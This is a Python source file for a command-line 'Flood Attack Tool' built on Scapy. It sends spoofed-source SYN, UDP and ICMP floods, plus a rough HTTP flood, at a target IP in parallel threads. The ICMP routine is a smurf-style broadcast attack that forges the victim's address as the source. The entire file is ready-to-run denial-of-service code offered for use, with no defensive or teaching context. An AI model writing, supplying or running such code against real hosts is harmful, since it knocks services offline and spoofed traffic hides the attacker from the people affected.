from sys import stdout
from scapy.all import *
from random import randint
from argparse import ArgumentParser
import threading
import time

data = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
# ICMP/UDP/TCP Flood Attack Tool
def main():
    print("______  _                    _     ___   _    _                 _      _____                 _ ")
    print("|  ___|| |                  | |    / _ \ | |  | |               | |    |_   _|              | |")
    print("| |_   | |  ___    ___    __| |   / /_\ \| |_ | |_   __ _   ___ | | __   | |    ___    ___  | |")
    print("|  _|  | | / _ \  / _ \  / _` |   |  _  || __|| __| / _` | / __|| |/ /   | |   / _ \  / _ \ | |")
    print("| |    | || (_) || (_) || (_| |   | | | || |_ | |_ | (_| || (__ |   <    | |  | (_) || (_) || |")
    print("\_|    |_| \___/  \___/  \__,_|   \_| |_/ \__| \__| \__,_| \___||_|\_\   \_/   \___/  \___/ |_|\n")
    time.sleep(1)
    
    parser = ArgumentParser()
    parser.add_argument("--SynFlood", "-s", action='store_true', help="Syn Flood Attack")
    parser.add_argument("--UDPFlood", "-u", action='store_true', help="UDP Flood Attack")
    parser.add_argument("--ICMPFlood", "-i", action='store_true', help="ICMP Flood Attack")
    parser.add_argument("--HTTPFlood", "-H", action='store_true', help="HTTP Flood Attack")
    parser.add_argument("--target", "-t", required=True, help="target IP address")
    parser.add_argument("--port", "-p", default=80, help="target port number")
    parser.add_argument("--thread", "-T", default=10, help="target port number")
    parser.add_argument(
        "--repeat", "-r", default=100, help="attack number of repetition"
    )

    args = parser.parse_args()
    
    dstIP = args.target
    dstPort = args.port
    repeat = args.repeat

    if args.SynFlood:
        target = SynFlood
    elif args.UDPFlood:
        target = UDPFlood
    elif args.ICMPFlood:
        target = ICMPFlood
    elif args.HTTPFlood:
        target = HTTPFlood
    else:
        print("-"*35 + "Attack Type is Missing"+35*"-"+"\n")
        return
    
    threads =[]
    for _ in range(int(args.thread)):
        t = threading.Thread(target=target,args=(dstIP,dstPort,int(repeat)))
        t.start()
        threads.append(t)
    for thread in threads:
        thread.join()

def randomSrcIP():
    ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
    return ip 

def randomPort():
    port = randint(0, 65535)
    return port

def SynFlood(dstIP,dstPort,repeat):
    for x in range(int(repeat)):
        IP_Packet = IP()
        IP_Packet.src = randomSrcIP()
        IP_Packet.dst = dstIP

        TCP_Packet = TCP()
        TCP_Packet.sport = randomPort() # default port : 20
        TCP_Packet.dport = dstPort
        TCP_Packet.flags = "S"

        send(IP_Packet/TCP_Packet,verbose=0)

def HTTPFlood(dstIP,dstPort,repeat):
    for x in range(repeat):
        try:
            IP_Packet = IP()
            IP_Packet.dst = dstIP
            IP_Packet.src = randomSrcIP()

            TCP_Packet = TCP()
            TCP_Packet.sport = randomPort()
            TCP_Packet.dport = dstPort
            TCP_Packet.flags="S"
            
            syn = IP_Packet/TCP_Packet
            packet_SynAck = sr1(syn,timeout=1)
            
            if(packet_SynAck is None):
                print("-"*35 + "ACK+SYN Packet is Filtered"+35*"-"+"\n")
                continue
            TCP_Packet.flags="A"
            TCP_Packet.seq = packet_SynAck[TCP].ack
            TCP_Packet.ack= packet_SynAck[TCP].seq+1
            getStr='GET / HTTP/1.0\n\n'

            send(IP_Packet/TCP_Packet/getStr)
        except:
            print("-"*35 + "Error Occured during Sending packets"+35*"-"+"\n")

def UDPFlood(dstIP,dstPort,repeat):
    for x in range(repeat):
        IP_Packet = IP()
        IP_Packet.src = randomSrcIP()
        IP_Packet.dst = dstIP

        UDP_Packet = UDP()
        UDP_Packet.dport = randomPort()
        send(IP_Packet/UDP_Packet/Raw(load=data))

def ICMPFlood(dstIP,dstPort,repeat):
    for x in range(repeat):
        IP_Packet = IP()
        IP_Packet.src = dstIP
        IP_Packet.dst = "255.255.255.255"
        ICMP_Packet = ICMP()
        send(IP_Packet/ICMP())

main()
